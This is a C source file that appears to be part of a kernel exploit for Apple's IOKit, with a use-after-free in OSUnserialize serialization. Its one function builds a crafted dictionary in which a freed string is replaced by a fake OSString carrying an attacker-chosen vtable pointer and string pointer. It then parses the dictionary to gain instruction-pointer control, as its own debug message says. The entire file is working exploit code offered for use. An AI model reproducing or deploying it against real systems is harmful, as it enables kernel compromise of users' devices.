//#include <stddef.h>             // size_t
#include <stdint.h>             // uint32_t
//#include <stdlib.h>             // malloc
//#include <string.h>             // strerror

//#include <IOKit/IOKitLib.h>     // IO*, io_*

#include "common.h"             // DEBUG, PRINT_BUF
#include "io.h"                 // kOS*, OSString, dict_parse

#include "uaf_exec.h"

void uaf_parse(const OSString *fake)
{
    DEBUG("Using UAF to get RIP control...");

    const uint32_t *data = (const uint32_t*)fake;
    PRINT_BUF("Data", data, sizeof(OSString));

    const char str[4] = "str",
               ref[4] = "ref";
    uint32_t dict[8 + sizeof(OSString) / sizeof(uint32_t)] =
    {
        kOSSerializeMagic,                                          // Magic
        kOSSerializeEndCollection | kOSSerializeDictionary | 4,     // Dictionary with 4 entries

        kOSSerializeString | 4,                                     // String that will get freed
        *((uint32_t*)str),
        kOSSerializeData | sizeof(OSString),                        // OSData with same size as OSString
#ifdef __LP64__
        data[0],                                                    // vtable pointer (lower half)
        data[1],                                                    // vtable pointer (upper half)
        data[2],                                                    // retainCount
        data[3],                                                    // flags
        data[4],                                                    // length
        data[5],                                                    // (padding)
        data[6],                                                    // string pointer (lower half)
        data[7],                                                    // string pointer (upper half)
#else
        data[0],                                                    // vtable pointer
        data[1],                                                    // retainCount
        data[2],                                                    // flags
        data[3],                                                    // length
        data[4],                                                    // string pointer
#endif

        kOSSerializeSymbol | 4,                                     // Whatever name for our reference
        *((uint32_t*)ref),
        kOSSerializeEndCollection | kOSSerializeObject | 1,         // Reference to object 1 (OSString)
    };
    PRINT_BUF("Dict", dict, sizeof(dict));

    //sleep(1); /* TODO: DEBUG */

    dict_parse(dict, sizeof(dict));
}